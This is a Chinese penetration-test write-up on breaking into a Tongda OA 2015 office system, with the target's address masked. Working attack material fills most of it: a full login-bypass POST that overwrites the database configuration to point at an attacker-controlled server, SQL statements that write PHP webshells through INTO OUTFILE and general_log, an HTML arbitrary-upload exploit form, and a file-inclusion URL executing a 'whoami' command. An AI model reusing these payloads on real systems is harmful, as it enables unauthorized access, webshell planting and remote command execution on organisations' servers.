> 此次渗透主要利用了通达OA系统的一个nday漏洞+两个1day漏洞，目前网上均无具体完整的poc，本文将尽可能详细地总结一下利用过程

目标站点：  
![](https://image.3001.net/images/20210110/1610240603_5ffa525b898791d780899.jpg!small)  
探测后判断为通达OA2015版本系统，存在多处sql注入漏洞与登录绕过漏洞，因通达OA2015版本已对多个sql危险函数进行过滤，故sql注入利用价值不高，下文具体复现一下登录绕过漏洞。

 **漏洞1：全局变量覆盖漏洞**

    
    
    因没找到2015版的通达OA源码，故搬运一下乌云上的分析：
    存在漏洞处：/inc/td_config.php:
    

![](https://image.3001.net/images/20210110/1610240650_5ffa528a686056522c72d.jpg!small)

载入数据库配置是在include common.inc.php之后，可以被覆盖。故可在外网创建同种架构的数据库，覆盖目标原本的数据库连接。  
然而棘手的是弄清楚通达OA系统的数据库结构和数据之间的关系，并搭一个一摸一样的出来，网上对该漏洞的利用只有两篇，并且只给了poc，但显然如果数据库数据不对应，连接上后也没办法骗过后台登陆，于是我上网找了通达OA低版本的下载包，没找到15版的，但下了个17版的，据说数据架构都差不多，经过艰难的配环境和调配置后，终于让数据库上线了（系统没搭起来，我严重怀疑是下载包有问题），具体架构如下：  
![](https://image.3001.net/images/20210110/1610240659_5ffa52936594e1496eb6f.png!small)

显然我们只需要几个跟user有关的表即可，但嫌麻烦就一起打包了，挂到公网上，又根据利用过程中的报错改了几个表名，最终成功绕过登录：

poc：

    
    
    POST /logincheck.php HTTP/1.1
    Host: *.*.*.*
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 182
    Origin: http://*.*.*.*
    Connection: close
    Referer: http://*.*.*.*/
    Cookie: PHPSESSID=ehbu2rp785vs9ht7lb83ddeho7
    Upgrade-Insecure-Requests: 1
    
    UNAME=admin&PASSWORD=&encode_type=1&encode_type=1&MYOA_MASTER_DB[id]=1&MYOA_MASTER_DB[host]="搭载数据库的vps的ip"&MYOA_MASTER_DB[user]=root&MYOA_MASTER_DB[pwd]=root密码&MYOA_MASTER_DB[db]="OA系统对应的数据库名，一般为TD_OA"
    

![](https://image.3001.net/images/20210110/1610240714_5ffa52ca65c6ac7b32bfb.jpg!small)

    
    
    总结：
    1.漏洞原因为common.inc.php中存在全局变量覆盖，可更改目标数据库连接配置
    2.通达OA的数据库架构各版本差不多，注意2015版的所有表名须大写，2015版后似乎都变为小写了
    3.sql脚本导入时报错了，就不放sql打包文件了，大家复现时可以导几个重要的表即可，其余表缺少会报错但仍可成功登录
    

**漏洞2：sql脚本绕过过滤（未复现成功）**  
成功登录admin账户后，发现原本无数据库操作权限，故进入用户管理输入默认空超密码后可对自身提权，具有操作数据库权限后可进行数据库的导出：

![](https://image.3001.net/images/20210110/1610240698_5ffa52baade331b8d8fb5.png!small)

还可上传sql脚本，因通达OA对root限制了文件操作权限，故可先更改权限再进行shell的导出：

    
    
    update mysql.user set file_priv='Y' where user='root';
    flush privileges;
    select concat("'",0x3C3F7068702061737365727428245F504F53545B615D29203F3E) into outfile '../webroot/test.php';
    update mysql.user set file_priv='N' where user='root';
    flush privileges;
    

或通过日志写入shell：

    
    
    set global general_log_file = '../webroot/test.php';
    set global general_log = on;
    select '<?php assert($_POST[a]) ?>';
    set global general_log = off;
    

可惜两种方式均失败了。。可能是系统打过补丁或mysql版本较新，遂放弃  
 **漏洞3：任意文件上传**  
漏洞最早爆出时间为2020年8月21日，目前网上暂无真实有效的利用过程，poc也均做了打码处理，只能老老实实审代码。  
用SeayDzend工具将2017版的通达OA源码解密，因为该漏洞存在于15-17版本，所以源码应该差不多。  
进入存在漏洞文件general/reportshop/utils/upload.php，代码就不贴了，主要分析一下逻辑：  
首先服务器对file_id进行默认赋值，若不为空则不赋值，此变量即为我们上传的文件在表单中对应的name，故需与后台保持一致。接着对请求的action做判断，action=upload则进入上传文件方法，之后判断filetype变量，分为img/xls/other分别上传进不同目录，然后调用上传方法，在我的2017版本源码中对php/exe/js后缀做了过滤，但实际测试中发现并未过滤，可能是我这版自带补丁。。且注意到上传类型如果是xls或其他文件，服务器不会更改文件名，于是我们可以构造exp：

    
    
    <html>
    <body>
    通达2015-2017任意文件上传exp<br>
    <form action="http://*.*.*.*/general/reportshop/utils/upload.php?cluster=&action=upload&filetype=xls" method="POST" enctype="multipart/form-data">
    <input name="FILE1" type="file"><br>
    <input type="submit">
    </body>
    </html>
    

上传成功后返回true，文件已保存入/webroot/attachment/reportshop/attachment/目录下，但注意默认attachment目录下php文件是无法直接访问的，会返回403，因此还需要找一个包含漏洞。  
 **漏洞4：任意文件包含**  
据说通达OA全版本都有个包含漏洞，不过似乎偏偏落下了2015，/mac/gateway.php和/ispirit/interface/gateway.php都不存在，于是只好继续利用新洞。  
访问存在漏洞文件/inc/second_tabs.php，这个代码比较少，就直接放了：

    
    
    <?php
    
    include_once "inc/auth.inc.php";
    include_once "inc/utility_all.php";
    ob_end_clean();
    if (preg_match("/[^a-zA-Z0-9_\/]+/", $FUNC_CODE) || (substr($FUNC_CODE, 0, 9) != "/general/")) {
        echo _("无效的参数");
        exit();
    }
    
    $FUNC_CODE = unescape($FUNC_CODE);
    $FUNC_CODE = ltrim($FUNC_CODE, "/");
    $MENU_TOP = MYOA_ROOT_PATH . $FUNC_CODE . "/menu_top.php";
    $dataType = "javascript";
    
    if (file_exists($MENU_TOP)) {
        include_once $FUNC_CODE . "/menu_top.php";
    }
    else {
        echo json_encode("0");
    }
    
    ?>
    

可以看到，服务器先对menu_top变量赋值并判断是否存在，若存在则包含对应php文件，我这份应该也是打过补丁的，2015版本不对FUNC_MODE做前九位校验，故可直接包含/attachment目录下的文件。  
故可先上传一个名为menu_top.php的文件：

![](https://image.3001.net/images/20210110/1610240731_5ffa52db8c3cf19c0ce3e.jpg!small)

接着访问[http://*.*.*.*/inc/second_tabs.php?FUNC_CODE=/attachment/reportshop/templates&cmd=whoami](/inc/second_tabs.php?FUNC_CODE=/attachment/reportshop/templates&cmd=whoami)包含：  
![](https://image.3001.net/images/20210110/1610240744_5ffa52e8599b5ab244126.jpg!small)

利用成功

